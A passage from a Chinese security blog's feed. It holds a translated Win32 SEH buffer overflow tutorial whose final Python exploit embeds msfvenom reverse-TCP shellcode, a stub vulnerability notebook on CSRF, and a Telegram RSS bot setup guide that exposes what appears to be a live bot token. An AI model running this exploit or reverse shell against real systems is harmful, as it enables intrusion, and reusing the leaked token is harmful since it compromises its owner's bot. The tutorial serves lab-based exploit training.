class="line">&quot;\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf&quot;</span><br><span class="line">&quot;\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf&quot;</span><br><span class="line">&quot;\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buffer = &quot;A&quot; * (4061-len(badchars))</span><br><span class="line">print &quot;[*] There are %s&quot; %len(badchars) + &quot; bad chars to test&quot;</span><br><span class="line">print &quot;[*] Starting to GET Variable&quot;</span><br><span class="line">buffer += badchars #All of badchars</span><br><span class="line">buffer += nseh #BBBB</span><br><span class="line">buffer += seh #CCCC</span><br><span class="line">junk = &quot;D&quot;*(5000-len(buffer))</span><br><span class="line">buffer += junk #Bunch of D&quot;s to fill remaining space</span><br><span class="line"></span><br><span class="line">payload = &quot;GET %d&quot; + str(buffer) + &quot; HTTP/1.1\r\n&quot;</span><br><span class="line">payload += &quot;Host: bof.local\r\n&quot;</span><br><span class="line">payload += &quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36\r\n&quot;</span><br><span class="line">payload += &quot;Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GET Variable with %s bytes&quot; %len(payload)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,80))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 80&quot;</span><br><span class="line">s.send((payload))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GET Variable with %s bytes&quot; %len(payload)</span><br></pre></td></tr></table></figure><p>假设我们反复冲洗并找到内存转储中的所有无效字符，我们将找到所需的东西，在这种情况下，我的发现是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x00\x0d\x0a\x0c\x20\x25\x2b\x2f\x5c</span><br></pre></td></tr></table></figure><h3 id="2-2-4-查找POP-POP-RET指令"><a href="#2-2-4-查找POP-POP-RET指令" class="headerlink" title="2.2.4 查找POP POP RET指令"></a>2.2.4 查找POP POP RET指令</h3><p>在本文中，我已经对此进行了广泛的介绍，因此，我将直接进入操作并找到包含<code>pop pop ret</code>指令的模块。</p><p>当然，我们将再次使用<strong>mona</strong>通过以下方便的命令来完成此操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona seh</span><br></pre></td></tr></table></figure><p>当然，这里的目标是找到一个未经任何安全限制（例如<strong>ASLR</strong>，<strong>Safe SEH</strong>等）编译的模块。</p><p>您会注意到，在运行时，<code>!mona seh</code>它会在日志窗口中显示10个结果，但没有一个真正适合您，很容易在这里感到困惑，并开始怀疑是否还有要使用的模块。然而！如果检查<code>seh.txt</code>位于<strong>mona</strong>工作目录中的<code>.txt</code>文件，您会发现一个非常大的文件，其中包含数百个，甚至数千个可用模块。</p><p>以我为例，我滚动浏览了所有以开头的模块，<code>00</code>以避免无意中在缓冲区中实现流氓<strong>空字节</strong>。</p><p>我选择的选项是 <code>0x1000108b</code></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011141203.png" class="lozad"></p><p>现在，我将此值添加到我的python脚本中的<strong>SEH</strong>变量中，并执行它以验证我的想法是正确的，并且执行按预期进行。</p><p><strong>更新的Python脚本</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nseh = &quot;B&quot;*4</span><br><span class="line">seh = &quot;\x99\xab\x01\x10&quot; #0x1001ab99 pop pop ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buffer = &quot;A&quot; * 4061</span><br><span class="line">print &quot;[*] Starting to GET Variable&quot;</span><br><span class="line">buffer += nseh #BBBB</span><br><span class="line">buffer += seh #pop pop ret</span><br><span class="line">junk = &quot;D&quot;*(10000-len(buffer))</span><br><span class="line">buffer += junk #Bunch of D&quot;s to fill remaining space</span><br><span class="line"></span><br><span class="line">payload = &quot;GET %d&quot; + str(buffer) + &quot; HTTP/1.1\r\n&quot;</span><br><span class="line">payload += &quot;Host: bof.local\r\n&quot;</span><br><span class="line">payload += &quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36\r\n&quot;</span><br><span class="line">payload += &quot;Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GET Variable with %s bytes&quot; %len(payload)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,80))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 80&quot;</span><br><span class="line">s.send((payload))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GET Variable with %s bytes&quot; %len(payload)</span><br></pre></td></tr></table></figure><p>执行后检查<strong>抗扰性</strong>显示<strong>SEH Handler</strong>现在已被我们的<code>pop pop ret</code>小工具（也称为<strong>1001ab99）</strong>的内存地址覆盖</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011141239.png" class="lozad"></p><p>而且，如果我们不通过<strong>Shift + F9</strong>将异常传递给程序，则会将<strong>nSEH</strong><code>pop pop ret</code>的值和<strong>nSEH</strong>的值放置在<strong>EIP寄存器中以</strong>备执行。<strong>答对了！</strong></p><p>在这种情况下，<strong>053A6FAC</strong>是堆栈中<strong>nSEH</strong>的地址，因此我们执行此位置的任何内容都将被执行。如下面的屏幕截图所示。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011141252.png" class="lozad"></p><h3 id="2-2-5-生成Shellcode"><a href="#2-2-5-生成Shellcode" class="headerlink" title="2.2.5 生成Shellcode"></a>2.2.5 生成Shellcode</h3><p>现在与VulnServer不同，在缓冲区<strong>之后</strong>我们可以使用的空间非常有限- 在这种情况下，精确到<strong>52字节</strong>，在我们的<strong>nSEH</strong>和<strong>SEH</strong>值之后，我们<strong>还有</strong>很多空间，精确到<strong>931字节</strong>。</p><p>现在，只要对我们的shell代码进行一点编码，我们就应该能够将我们的shellcode放在这里，并<code>Short JMP</code>在<strong>nSEH</strong>指针中添加一些代码直接跳入其中。</p><p>但是，首先让我们使用可信任的<strong>MSFVenom</strong>生成一些shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m0chan@kali:/&gt; msfvenom -p windows/shell/reverse_tcp LHOST=172.16.10.171 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b &quot;\x00\x0d\x0a\x0c&quot;</span><br></pre></td></tr></table></figure><p>您可能会注意到，这次我选择了分段式负载，而无段式只是为了帮助减小负载大小。</p><h3 id="2-2-6-最终利用"><a href="#2-2-6-最终利用" class="headerlink" title="2.2.6 最终利用"></a>2.2.6 最终利用</h3><p>跳转到shell代码并执行最终的shellcode。为了安全起见，现在要做的所有工作就是将我们的shell代码<code>D</code>与一些缓冲区一起放在缓冲区中<code>NOPS</code>，并从<strong>nSEH</strong>执行<strong>6字节的</strong>跳转，该跳转将<strong>落入</strong>我们的NOP Sled并直接进入shellcode。</p><p>我们可以做到这一点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nseh = &quot;\xeb\x06\x90\x90&quot;</span><br></pre></td></tr></table></figure><p>现在我们的最终漏洞利用将如下所示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nseh = &quot;\xeb\x06\x90\x90&quot;</span><br><span class="line">seh = &quot;\x99\xab\x01\x10&quot; #0x1001ab99 pop pop ret</span><br><span class="line"></span><br><span class="line">#msfvenom -p windows/shell/reverse_tcp LHOST=172.16.10.171 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b &quot;\x00\x0d\x0a\x0c\x20\x25\x2b\x2f\x5c&quot;</span><br><span class="line"></span><br><span class="line">shellcodenops = &quot;\x90\x90\x90\x90&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line">&quot;\xbd\xe0\x3c\x1c\xcb\xda\xc2\xd9\x74\x24\xf4\x5a\x31\xc9\xb1&quot;</span><br><span class="line">&quot;\x5b\x31\x6a\x14\x83\xea\xfc\x03\x6a\x10\x02\xc9\xe0\x23\x40&quot;</span><br><span class="line">&quot;\x32\x19\xb4\x24\xba\xfc\x85\x64\xd8\x75\xb5\x54\xaa\xd8\x3a&quot;</span><br><span class="line">&quot;\x1f\xfe\xc8\xc9\x6d\xd7\xff\x7a\xdb\x01\x31\x7a\x77\x71\x50&quot;</span><br><span class="line">&quot;\xf8\x85\xa6\xb2\xc1\x46\xbb\xb3\x06\xba\x36\xe1\xdf\xb1\xe5&quot;</span><br><span class="line">&quot;\x16\x6b\x8f\x35\x9c\x27\x1e\x3e\x41\xff\x21\x6f\xd4\x8b\x78&quot;</span><br><span class="line">&quot;\xaf\xd6\x58\xf1\xe6\xc0\xbd\x3f\xb0\x7b\x75\xb4\x43\xaa\x47&quot;</span><br><span class="line">&quot;\x35\xef\x93\x67\xc4\xf1\xd4\x40\x36\x84\x2c\xb3\xcb\x9f\xea&quot;</span><br><span class="line">&quot;\xc9\x17\x15\xe9\x6a\xdc\x8d\xd5\x8b\x31\x4b\x9d\x80\xfe\x1f&quot;</span><br><span class="line">&quot;\xf9\x84\x01\xf3\x71\xb0\x8a\xf2\x55\x30\xc8\xd0\x71\x18\x8b&quot;</span><br><span class="line">&quot;\x79\x23\xc4\x7a\x85\x33\xa7\x23\x23\x3f\x4a\x30\x5e\x62\x03&quot;</span><br><span class="line">&quot;\xf5\x53\x9d\xd3\x91\xe4\xee\xe1\x3e\x5f\x79\x4a\xb7\x79\x7e&quot;</span><br><span class="line">&quot;\xdb\xdf\x79\x50\x63\x8f\x87\x51\x94\x86\x43\x05\xc4\xb0\x62&quot;</span><br><span class="line">&quot;\x26\x8f\x40\x8a\xf3\x3a\x4a\x1c\x50\xaa\x40\x77\xc0\xc9\x54&quot;</span><br><span class="line">&quot;\x86\xaa\x47\xb2\xd8\x9c\x07\x6a\x99\x4c\xe8\xda\x71\x87\xe7&quot;</span><br><span class="line">&quot;\x05\x61\xa8\x2d\x2e\x08\x47\x98\x07\xa5\xfe\x81\xd3\x54\xfe&quot;</span><br><span class="line">&quot;\x1f\x9e\x57\x74\xaa\x5f\x19\x7d\xdf\x73\x4e\x1a\x1f\x8b\x8f&quot;</span><br><span class="line">&quot;\x8f\x1f\xe1\x8b\x19\x77\x9d\x91\x7c\xbf\x02\x69\xab\xc3\x44&quot;</span><br><span class="line">&quot;\x95\x2a\xf2\x3f\xa0\xb8\xba\x57\xcd\x2c\x3b\xa7\x9b\x26\x3b&quot;</span><br><span class="line">&quot;\xcf\x7b\x13\x68\xea\x83\x8e\x1c\xa7\x11\x31\x75\x14\xb1\x59&quot;</span><br><span class="line">&quot;\x7b\x43\xf5\xc5\x84\xa6\x85\x02\x7a\x35\xa2\xaa\x13\xc5\xf2&quot;</span><br><span class="line">&quot;\x4a\xe4\xaf\xf2\x1a\x8c\x24\xdc\x95\x7c\xc5\xf7\xfd\x14\x4c&quot;</span><br><span class="line">&quot;\x96\x4c\x84\x51\xb3\x11\x18\x52\x30\x8a\xab\x29\x39\x2d\x4c&quot;</span><br><span class="line">&quot;\xce\x53\x4a\x4c\xcf\x5b\x6c\x70\x06\x62\x1a\xb7\x9b\xd1\x05&quot;</span><br><span class="line">&quot;\x2a\x31\x2c\xae\xf3\xd0\x8d\xb3\x03\x0f\xd1\xcd\x87\xa5\xaa&quot;</span><br><span class="line">&quot;\x29\x97\xcc\xaf\x76\x1f\x3d\xc2\xe7\xca\x41\x71\x07\xdf&quot;)</span><br><span class="line"></span><br><span class="line">buffer = &quot;A&quot; * 4061</span><br><span class="line">print &quot;[*] Starting to GET Variable&quot;</span><br><span class="line">buffer += nseh #BBBB</span><br><span class="line">buffer += seh #pop pop ret</span><br><span class="line">buffer += shellcodenops</span><br><span class="line">buffer += shellcode</span><br><span class="line">junk = &quot;D&quot;*(10000-len(buffer))</span><br><span class="line">buffer += junk #Bunch of D&quot;s to fill remaining space</span><br><span class="line"></span><br><span class="line">payload = &quot;GET %d&quot; + str(buffer) + &quot; HTTP/1.1\r\n&quot;</span><br><span class="line">payload += &quot;Host: bof.local\r\n&quot;</span><br><span class="line">payload += &quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36\r\n&quot;</span><br><span class="line">payload += &quot;Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print &quot;[*] Starting to Fuzz GET Variable with %s bytes&quot; %len(payload)</span><br><span class="line">s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((&apos;bof.local&apos;,80))</span><br><span class="line">print &quot;[*] Connected to bof.local on Port 80&quot;</span><br><span class="line">s.send((payload))</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*] Finished Fuzzing GET Variable with %s bytes&quot; %len(payload)</span><br></pre></td></tr></table></figure><p>与<strong>VulnServer</strong>相似-我还在Visio中创建了一个漂亮的小图，以演示该漏洞利用过程并从较高的角度进行跳转。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011141315.png" class="lozad"></p><h1 id="0x03-参考资料-资源"><a href="#0x03-参考资料-资源" class="headerlink" title="0x03 参考资料/资源"></a>0x03 参考资料/资源</h1><p>特别鸣谢以下所有民众：</p><p><a href="https://h0mbre.github.io/" target="_blank" rel="noopener">https://h0mbre.github.io</a></p><p><a href="https://www.securitysift.com/" target="_blank" rel="noopener">https://www.securitysift.com</a></p><p><a href="https://captmeelo.com/" target="_blank" rel="noopener">https://captmeelo.com</a></p><p><a href="https://www.fuzzysecurity.com/" target="_blank" rel="noopener">https://www.fuzzysecurity.com</a></p><p><a href="https://securitychops.com/" target="_blank" rel="noopener">https://securitychops.com</a></p><p><a href="https://nutcrackerssecurity.github.io/Windows4.html" target="_blank" rel="noopener">https://nutcrackerssecurity.github.io/Windows4.html</a></p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;这是一篇翻译的文章，出自&lt;a href=&quot;https://m0chan.github.io/2019/08/21/Win32-Buffer-Overflow-SEH.html，本作者只做翻译工作，版权为原作者所有，如有侵权，请联系删除。&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://m0chan.github.io/2019/08/21/Win32-Buffer-Overflow-SEH.html，本作者只做翻译工作，版权为原作者所有，如有侵权，请联系删除。&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="-翻译文章" scheme="https://www.mad-coding.cn/categories/%E7%BF%BB%E8%AF%91%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="缓冲区溢出" scheme="https://www.mad-coding.cn/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>我的漏洞库（不断跟新中）</title>
    <link href="https://www.mad-coding.cn/2019/10/11/%E6%88%91%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%BA%93/"/>
    <id>https://www.mad-coding.cn/2019/10/11/我的漏洞库/</id>
    <published>2019-10-11T02:42:08.000Z</published>
    <updated>2019-10-28T08:51:55.626Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>为了积累在工作中碰到的一些漏洞以及在一些文章中看到的一些漏洞，决定采用文本的方式记录下来，一来方便自己查看，二来也可以方便自己以后写报告。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011165501.png" class="lozad"></p><a id="more"></a><h1 id="0x01-web漏洞"><a href="#0x01-web漏洞" class="headerlink" title="0x01 web漏洞"></a>0x01 web漏洞</h1><h2 id="1-1-SSRF"><a href="#1-1-SSRF" class="headerlink" title="1.1 SSRF"></a>1.1 SSRF</h2><h3 id="1-1-1-漏洞描述"><a href="#1-1-1-漏洞描述" class="headerlink" title="1.1.1 漏洞描述"></a>1.1.1 漏洞描述</h3><h3 id="1-1-2-风险分析"><a href="#1-1-2-风险分析" class="headerlink" title="1.1.2 风险分析"></a>1.1.2 风险分析</h3><h3 id="1-1-3-风险等级"><a href="#1-1-3-风险等级" class="headerlink" title="1.1.3 风险等级"></a>1.1.3 风险等级</h3><h3 id="1-1-4-修复建议"><a href="#1-1-4-修复建议" class="headerlink" title="1.1.4 修复建议"></a>1.1.4 修复建议</h3><h2 id="1-2-CSRF"><a href="#1-2-CSRF" class="headerlink" title="1.2 CSRF"></a>1.2 CSRF</h2><h3 id="1-2-1-漏洞描述"><a href="#1-2-1-漏洞描述" class="headerlink" title="1.2.1 漏洞描述"></a>1.2.1 漏洞描述</h3><p>CSRF的形成是因为攻击者较容易猜测某些Web应用一个特定敏感操作的所有细节。利用浏览器能保存会话cookie等凭证，并会自动发送的特点，攻击者可以创建一个恶意web页面生成伪造请求，再利用社会工程学的手段诱惑受害者进行操作，从而在被攻击Web应用上伪装成受害者进行特定敏感操作，如修改密码、通信方式甚至转账等。</p><h2 id="1-2-2-风险分析"><a href="#1-2-2-风险分析" class="headerlink" title="1.2.2 风险分析"></a>1.2.2 风险分析</h2><p>可能会窃取或操纵客户会话和 cookie，它们可能用于模仿合法用户，从而使黑客能够以该用户身份查看或变更用户记录以及执行事务。</p><h3 id="1-2-3-风险等级"><a href="#1-2-3-风险等级" class="headerlink" title="1.2.3 风险等级"></a>1.2.3 风险等级</h3><p>中危</p><h3 id="1-2-4-修复建议"><a href="#1-2-4-修复建议" class="headerlink" title="1.2.4 修复建议"></a>1.2.4 修复建议</h3><p>避免 CSRF 攻击，每个请求都应该包含唯一标识，它是攻击者所无法猜测的参数，并且该参数不存在于cookie之中。可以在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器端验证该token。若请求中没有token或token内容不正确，便废弃请求。</p><h1 id="0x02-主机漏洞"><a href="#0x02-主机漏洞" class="headerlink" title="0x02 主机漏洞"></a>0x02 主机漏洞</h1><h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;为了积累在工作中碰到的一些漏洞以及在一些文章中看到的一些漏洞，决定采用文本的方式记录下来，一来方便自己查看，二来也可以方便自己以后写报告。&lt;/p&gt;
&lt;p&gt;&lt;img alt data-src=&quot;https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011165501.png&quot; class=&quot;lozad&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://www.mad-coding.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="漏洞库" scheme="https://www.mad-coding.cn/tags/%E6%BC%8F%E6%B4%9E%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>使用telegram搭建一个rss订阅机器人</title>
    <link href="https://www.mad-coding.cn/2019/10/10/%E4%BD%BF%E7%94%A8telegram%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AArss%E8%AE%A2%E9%98%85%E6%9C%BA%E5%99%A8%E4%BA%BA/"/>
    <id>https://www.mad-coding.cn/2019/10/10/使用telegram搭建一个rss订阅机器人/</id>
    <published>2019-10-10T06:27:20.000Z</published>
    <updated>2019-10-28T08:28:43.579Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 +前言"></a>0x00 +前言</h1><p>一直想打造一个可以订阅一些好的博客或者网站直接的东西，但是很多免费的RSS阅读器广告特别多，所以就很少打开了，今天看到一篇文章说可以利用telegram+vps搭建一个RSS订阅的机器人，一下子吸引了我，今天就把这个技能分享给大家</p><a id="more"></a><h1 id="0x01-前期准备"><a href="#0x01-前期准备" class="headerlink" title="0x01 前期准备"></a>0x01 前期准备</h1><blockquote><p>环境准备：</p><ol><li>一个vps：Ubuntu 16系统</li><li>telegram</li><li>科学**</li><li>xshell或者finalshell</li></ol></blockquote><h2 id="1-1-vps的购买"><a href="#1-1-vps的购买" class="headerlink" title="1.1 vps的购买"></a>1.1 vps的购买</h2><p>网址推荐：<a href="https://virmach.com/" target="_blank" rel="noopener">virmach</a> ;<a href="https://vp.xinping04.cn/bwg/" target="_blank" rel="noopener">搬瓦工</a></p><h2 id="1-2-telegram下载安装"><a href="#1-2-telegram下载安装" class="headerlink" title="1.2 telegram下载安装"></a>1.2 telegram下载安装</h2><p>Windows：<a href="https://telegram-for-desktop.en.softonic.com/" target="_blank" rel="noopener">传送门</a></p><p>Android：在Google play中自行下载</p><h2 id="1-3-科学-搭建"><a href="#1-3-科学-搭建" class="headerlink" title="1.3 科学**搭建"></a>1.3 科学**搭建</h2><p>教程：<a href="https://www.mad-coding.cn/2019/09/20/9元钱搭建一个自己的VPN/">传送门</a></p><h1 id="0x02-搭建RSS订阅机器人"><a href="#0x02-搭建RSS订阅机器人" class="headerlink" title="0x02 搭建RSS订阅机器人"></a>0x02 <strong>搭建RSS订阅机器人</strong></h1><h2 id="2-1-申请机器人"><a href="#2-1-申请机器人" class="headerlink" title="2.1 申请机器人"></a>2.1 <strong>申请机器人</strong></h2><p>首先需要申请一个Telegram机器人，非常简单，直接对话Telegram机器人之父（@BotFather），发送/newbot给它，之后输入你的机器人的名字，注意需要以bot结尾（例如我的是kangrss_bot），之后你的机器人就创建好了，并且会给你一个<strong>HTTP API TOKEN</strong>：</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191010144634.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191010144745.png" class="lozad"></p><p>记住这个token，待会需要用到</p><h2 id="2-2-搭建RSS订阅"><a href="#2-2-搭建RSS订阅" class="headerlink" title="2.2 搭建RSS订阅"></a>2.2 搭建RSS订阅</h2><p>搭建的RSS订阅机器人是基于开源软件rssbot的，一个开源的Telegram<br>RSS机器人，项目地址：<a href="https://github.com/iovxw/rssbot。" target="_blank" rel="noopener">https://github.com/iovxw/rssbot。</a></p><blockquote><p>还有一个听说也挺好用，但是我还没有用过</p><p><a href="https://github.com/indes/flowerss-bot" target="_blank" rel="noopener">https://github.com/indes/flowerss-bot</a></p></blockquote><h3 id="2-2-1【方法一】"><a href="#2-2-1【方法一】" class="headerlink" title="2.2.1【方法一】"></a>2.2.1【方法一】</h3><p>首先得登录VPS，然后安装相关依赖。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#CentOS系统 </span></span><br><span class="line">yum -y update &amp;&amp; yum -y install gcc make openssl* pkg* libssl* screen curl </span><br><span class="line"><span class="comment">#Ubuntu、Debian系统</span></span><br><span class="line">apt-get -y update &amp;&amp; apt-get -y install gcc make openssl pkg-config libssl-dev screen curl</span><br></pre></td></tr></table></figure><p>安装Rust Nightly</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://sh.rustup.rs -sSf | sh</span><br></pre></td></tr></table></figure><p>安装rssbot</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/iovxw/rssbot/archive/v1.4.2.tar.gz</span><br><span class="line">tar xvf v1.4.2.tar.gz</span><br><span class="line"><span class="built_in">cd</span> rssbot-1.4.2</span><br><span class="line">cargo build --release</span><br></pre></td></tr></table></figure><h3 id="2-2-2-【方法二】"><a href="#2-2-2-【方法二】" class="headerlink" title="2.2.2 【方法二】"></a>2.2.2 【方法二】</h3><p>直接下载编译好的rssbot.<a href="https://github.com/iovxw/rssbot/releases" target="_blank" rel="noopener">传送门</a></p><p>下载下来Linux版本的，然后使用远程终端连接工具xshell或finalshell来连接vps，将本地的rssbot文件上传到vps中，</p><h2 id="2-3-运行rssbot"><a href="#2-3-运行rssbot" class="headerlink" title="2.3 运行rssbot"></a>2.3 运行rssbot</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir RSS <span class="comment">#创建RSS文件夹</span></span><br><span class="line"><span class="built_in">cd</span> RSS</span><br><span class="line">chmod +x rssbot <span class="comment">#服务rssbot执行权限</span></span><br><span class="line">apt-get install screen</span><br><span class="line">./rssbot DATAFILE TELEGRAM-BOT-TOKEN</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191010145632.png" class="lozad"></p><p>然后按Ctrl + A + D 退出 screen （这样会后台运行）</p><p>使用下面的命令可以进入刚才启动服务的screen</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen -R rssbot</span><br></pre></td></tr></table></figure><p>最后我们就可以使用机器人了！</p><p>或者使用让rssbot后台运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup ./rssbot DATAFILE  890461373:AAEG7mwZdUDngqAJ9GVt2cir-AL1wltoJw4 &gt; log.file 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure><h1 id="0x03-订阅网站"><a href="#0x03-订阅网站" class="headerlink" title="0x03 订阅网站"></a>0x03 订阅网站</h1><p><code>rssbot</code>的指令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 